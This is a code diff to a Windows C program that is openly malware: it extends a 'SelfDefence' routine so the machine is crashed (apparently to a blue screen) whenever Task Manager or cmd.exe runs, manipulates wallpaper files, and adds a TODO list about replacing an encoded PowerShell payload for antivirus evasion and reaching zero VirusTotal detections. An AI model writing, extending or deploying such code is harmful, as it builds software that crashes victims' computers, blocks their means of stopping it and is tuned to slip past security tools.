@@ -1,5 +1,7 @@
 #include <stdio.h>
+#include <stdlib.h>
 #include <windows.h>
+#include <shellapi.h>
 #include <tlhelp32.h>
 
 #define IMPORT_BIN(sect, file, sym) asm(    \
@@ -39,7 +41,8 @@ void CrashSystem()
 
 void SelfDefence()
 {
-	char *Executable = "Taskmgr.exe";
+	char *TaskManager = "Taskmgr.exe";
+	char *CMD = "cmd.exe";
 
 	HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	PROCESSENTRY32 pe;
@@ -48,7 +51,7 @@ void SelfDefence()
 
 	while (b)
 	{
-		if (strcmp(pe.szExeFile, Executable) == 0)
+		if (strcmp(pe.szExeFile, TaskManager) == 0 || strcmp(pe.szExeFile, CMD) == 0)
 		{
 			CrashSystem();
 			return;
@@ -177,11 +180,12 @@ int main(void)
 	GetEnvironmentVariable("APPDATA", BackgroundImagePath, MAX_PATH);
 	strcat(BackgroundImagePath, "\\..\\..\\background.png");
 
+	char BackupWallpaper[MAX_PATH];
+	GetEnvironmentVariable("APPDATA", BackupWallpaper, MAX_PATH);
+	strcat(BackupWallpaper, "\\..\\..\\wallpaper.bmp");
+
 	char CurrentWallpaper[MAX_PATH];
 	SystemParametersInfo(SPI_GETDESKWALLPAPER, MAX_PATH, CurrentWallpaper, 0);
-
-	char BackupWallpaper[MAX_PATH];
-	sprintf(BackupWallpaper, "%s\\..\\..\\wallpaper.bmp", getenv("APPDATA"));
 
 	if (GetFileAttributes(DeleteFilePath) != INVALID_FILE_ATTRIBUTES)
 	{
@@ -209,3 +213,18 @@ int main(void)
 		CrashSystem();
 	}
 }
+
+/* TODO
+	- adding method to remove the leftover from temp
+	- adding method to choose between BSOD or doing nothing
+	- replacing the encoded powershell script (av evasion)
+	
+	- compiling project using tcc instead of gcc
+		-> using linker instead of incbin asm (tcc doesn't like incbin)
+			-> ld -r -b binary -o wallpaper.o wallpaper.png
+
+	- maybe adding more payloads (MessageBoxes, etc.)
+	- maybe add a highscore system like in "Rensenware"
+	- maybe adding a different song instead (satanic)
+	- maybe getting the VirusTotal detection rate to 0
+*/
